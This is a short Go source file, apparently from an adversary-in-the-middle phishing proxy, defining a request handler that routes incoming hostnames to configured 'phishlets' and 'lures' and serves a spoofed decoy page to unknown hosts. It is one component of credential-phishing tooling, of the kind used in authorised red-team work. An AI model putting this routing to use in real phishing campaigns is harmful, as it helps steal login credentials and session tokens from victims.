package request

import (
	"fmt"
	"net/http"
	"strings"

	"github.com/travisbale/mirage/internal/aitm"
	"github.com/travisbale/mirage/internal/proxy"
)

type hostnameChecker interface {
	Contains(hostname string) bool
}

type PhishletResolver interface {
	ResolveHostname(hostname, urlPath string) (*aitm.Phishlet, *aitm.Lure, error)
}

type PhishletRouter struct {
	Hostnames hostnameChecker
	Resolver  PhishletResolver
	Spoof     proxy.Spoofer
}

func (h *PhishletRouter) Name() string { return "PhishletRouter" }

func (h *PhishletRouter) Handle(ctx *aitm.ProxyContext, req *http.Request) error {
	hostname := hostWithoutPort(strings.ToLower(req.Host))
	if !h.Hostnames.Contains(hostname) {
		h.Spoof.ServeHTTP(ctx.ResponseWriter, req)
		return proxy.ErrShortCircuit
	}
	phishlet, lure, err := h.Resolver.ResolveHostname(hostname, req.URL.Path)
	if err != nil {
		return fmt.Errorf("phishlet_router: resolving %q: %w", hostname, err)
	}
	ctx.Phishlet = phishlet
	ctx.Lure = lure
	return nil
}

var _ proxy.RequestHandler = (*PhishletRouter)(nil)
